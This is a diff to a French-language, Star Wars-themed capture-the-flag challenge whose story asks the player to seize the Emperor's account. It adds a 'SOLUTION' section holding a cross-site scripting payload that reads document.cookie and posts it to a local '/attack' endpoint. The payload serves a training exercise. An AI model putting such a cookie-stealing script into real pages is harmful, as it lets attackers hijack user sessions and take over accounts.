@@ -273,6 +273,25 @@ Tu veux revenir, Vaylin ? Montre-moi que tu es digne de ce retour.
 
 Face à cette épreuve, vous comprenez qu'il vous faut récupérer  le compte de l'Empereur pour pouvoir passer le blocus imposé par la Flotte Éternelle. Sans y parvenir, vous vous exposeriez aux tirs meurtriers de l’armada, compromettant ainsi le plan audacieux qui pourrait bien être votre ultime chance de sauver la galaxie.
 
+
+SOLUTION 
+
+
+<script>
+fetch("http://localhost:3000/attack", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ variable: document.cookie })
+})
+.then(response => response.text())
+.then(data => console.log('Success:', data))
+.catch(error => console.error('Error:', error));
+</script>
+
+
+
 ** Après avoir trouvé le flag : 
 
 Vous arrivez donc a passer le blocus et votre prochain objectif est de battre l'Empereur Valkorion. 
